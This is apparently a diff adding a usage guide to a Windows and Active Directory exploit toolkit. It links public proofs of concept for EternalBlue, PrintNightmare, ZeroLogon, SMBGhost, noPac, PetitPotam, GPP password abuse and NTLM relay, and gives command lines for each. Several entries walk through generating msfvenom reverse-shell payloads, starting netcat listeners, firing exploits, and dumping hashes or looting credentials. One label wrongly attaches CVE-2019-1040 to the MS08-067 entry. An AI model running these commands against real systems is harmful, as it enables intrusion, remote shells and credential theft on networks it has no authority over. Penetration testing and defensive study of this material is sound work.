@@ -1,0 +1,167 @@
+=> BlueGate (or CVE-2020-0610)
+Some links:
+- https://github.com/ly4k/BlueGate
+Use examples:
+I - via CLI
+1) Execute the POC: 
+- python3 bluegate_cve20200610.py -M dos -P $TARGET_PORT $TARGET_IP
+II - via Python import
+- import POC.bluegate_cve20200610_poc as bluegate_poc
+- bluegate_poc.exploit_poc($TARGET_IP, $TARGET_PORT)
+
+=> Eternalblue (or MS17-010) 
+Some links:
+- https://github.com/worawit/MS17-010
+- https://github.com/d4t4s3c/Win7Blue
+Use examples:
+I - via CLI
+1) Shellcode generation with your listening IP and PORT: https://gist.github.com/worawit/05105fce9e126ac9c85325f0b05d6501
+2) Launch a listener (ex: netcat)
+- netcat -lvnp $PORT
+3) Execute the POC with the target and shellcode file path: 
+- python3 eternalblue_ms17010_poc.py $TARGET_IP $FILEPATH 13 
+II - via Python import
+- import POC.eternalblue_ms17010_poc as eternalblue_poc
+- eternalblue_poc.exploit($TARGET_IP, $FILEPATH_TO_SHELLCODE, 13, $USERNAME, $PASSWORD)
+
+=> GPP Abuse 
+Some links:
+- https://github.com/ShutdownRepo/Get-GPPPassword
+Use examples:
+I - via CLI
+1) Execute the POC with the DC target: 
+- python3 getgppcreds_scanner.py "$USERNAME"@"$DC_IP" (without password ex: for guest) or 
+- python3 getgppcreds_scanner.py "$DOMAIN_NAME"/"$USERNAME":"$PASSWORD"@"$DC_IP"
+II - via Python import
+- from SCANNER.getgppcreds_scanner import getgpp_creds as getgpp_poc
+- getgpp_poc(username=$USERNAME, password=$PASSWORD, domain=$DOMAIN_NAME, target_ip=$TARGET_IP, port=445, lmhash=$LMHASH, nthash=$NTHASH, share="SYSVOL", base_dir="/", aesKey=None, kerberos=None)
+
+=> MIC Remove attack (or CVE-2019-1040) [NOT IMPLEMENTED]
+Some links:
+- https://github.com/Ridter/CVE-2019-1040
+Use examples:
+I - via CLI
+- python CVE-2019-1040.py -ah attackterip -u user -p password -d domain.com -th DCip MailServerip  --just-dc-user krbtgt
+- python CVE-2019-1040.py -ah attackterip -u user --hashes userhash -d domain.com -th DCip MailServerip --just-dc-user krbtgt
+II - via Python import
+
+=> Netapi (or CVE-2019-1040)
+Some links:
+- https://github.com/andyacer/ms08_067
+- https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
+Use examples:
+I - via CLI
+1) Generate the payload/shellcode with your listening IP and PORT
+2) Launch a listener (ex: netcat)
+- netcat -lvnp $PORT
+3) Execute the POC with the target IP, the shellcode file path, the targeted OS: 
+- python3 netapi_cve20191040_poc.py $TARGET_IP $OS $PORT $FILEPATH
+II - via Python import
+- import POC.netapi_cve20084250_poc as netapi_poc
+
+
+=> Petitpotam
+Some links:
+- https://github.com/ly4k/PetitPotam
+- https://blog.zsec.uk/chasing-the-silver-petit-potam/
+Use examples:
+I - via CLI
+- Responder.py -I $INTERFACE --lm 
+- python3 PetitPotam.py $LISTENERIP $TARGETIP $USERNAME $PASSWORD
+II - via Python import
+- import POC.petitpotam_poc as petitpotam_poc
+- petitpotam_poc.exploit($USERNAME, $PASSWORD, $DOMAIN_NAME, $LMHASH, $NTHASH, $TARGET_IP, 'lsarpc', $TARGET_IP, $TARGET_IP, $LISTENERIP, kerberos=None)
+
+=> PrintNightmare (or CVE-2021-1675)
+Some links:
+- https://github.com/m8sec/CVE-2021-34527
+Use examples:
+I - via CLI
+1) Generate a payload: 
+- msfvenom -p windows_reverse_tcp_shell LHOST=$L_IP -f dll -o shellcode_printnightmare.dll
+- x86_64-w64-mingw32-gcc -shared -o shellcode_printnightmare shellcode_printnightmare.c"
+2) Launch a listener (ex: netcat)
+- netcat -lvnp $PORT
+3) Execute the POC with your credentials and via a DLL: 
+- python3 CVE-2021-1675.py -v -u $USERNAME -p $PASSWORD -d $DOMAIN -dll $NAME_DLL.dll --local-ip $MY_IP $TARGET_IP
+II - via Python import
+- import POC.printnightmare_cve20211675_poc as printnightmare_poc
+- printnightmare_poc.exploit($USERNAME, $PASSWORD, $LMHASH, $NTHASH, $DOMAIN_NAME, $PATH_TO_SHELLCODE, $TARGET_IP, $TARGET_PORT, proto="MS-RPRN", pDriverPath=None, timeout=5)
+
+=> PrinterBug (or SpoolSample) [NOT IMPLEMENTED]
+Some links:
+- https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+Use examples:
+I - via CLI
+II - via Python import
+
+=> sAMAccountName (or CVE-2021-42278)
+Some links:
+- https://github.com/ly4k/Pachine
+- https://github.com/Ridter/noPac
+Use examples:
+I - via CLI
+1) Execute the POC on the targeted DC with your credentials: 
+- python noPac.py $DOMAIN/$username:'$password' -dc-ip $DC_IP (to only export the admin ticket)
+- python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump (to dump the hashes)
+II - via Python import
+- import POC.sAMAccountName_cve202142278 as samaccountname_poc
+- samaccountname_poc.exploit_sAMANS($USERNAME, $PASSWORD, $NTLM_HASH, $DOMAIN_NAME, $TARGET_IP, $TARGET_IP, $DC_HOSTNAME, k=None, aesKey=None, no_tls=True, no_pass=None)
+
+=> SMBGhost (or CVE-2020-0796) [can be DANGEROUS]
+Some links:
+- https://github.com/Barriuso/SMBGhost_AutomateExploitation
+- https://github.com/ZecOps/CVE-2020-0796-RCE-POC
+- https://github.com/thelostworldFree/CVE-2020-0796
+- https://www.youtube.com/watch?v=yn59HYdwzDs
+Use examples:
+I - via CLI
+1) Generate the shellcode
+- msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=$OUR_IP LPORT=$OUR_LISTENING_PORT -f python "USER_PAYLOAD"
+2) Launch a listener (ex: netcat)
+- netcat -lvnp $PORT
+3) Execute the POC
+- python3 smbghost_cve20200796_poc.py -ip $TARGET_IP -p $TARGET_PORT -f $FILEPATH_TO_SHELLCODE
+II - via Python import
+- import POC.smbghost_cve20200796_poc as smbghost_poc
+
+ 
+=> SMBleed (or CVE-2020-1206) [can be DANGEROUS] [NOT IMPLEMENTED]
+Some links:
+- 
+Use examples:
+I - via CLI
+II - via Python import
+
+=> SMB Signing
+Some links:
+- https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/
+Use examples:
+I - via CLI
+1) To relay communication
+- ntlmrelayx -tf smb_sign_disabled.txt -smb2support -socks
+- responder -I $INTERFACE
+2) To loot directly
+- ntlmrelayx.py -t $IP -l loot
+II - via Python import
+
+=> ZeroLogon (or CVE-2020-1472) [DANGEROUS]
+Some links:
+- https://github.com/dirkjanm/CVE-2020-1472
+- https://github.com/thatonesecguy/zerologon-CVE-2020-1472
+Use examples:
+I - via CLI
+1) Execute it on the DC IP/Hostname: 
+- python3 zerologon_cve20201472_poc.py $DC_NAME $DC_IP
+2) Restore password?
+- Execute the restorepassword.py from the github repo
+II - via Python import
+- import POC.zerologon_cve20201472_poc as zerologon_poc
+
+
+=> HiveNightmare (or CVE-2021-36934) 
+Some links
+- https://github.com/GossiTheDog/HiveNightmare
+Use examples:
+1) via CLI
+- psexec.py ...
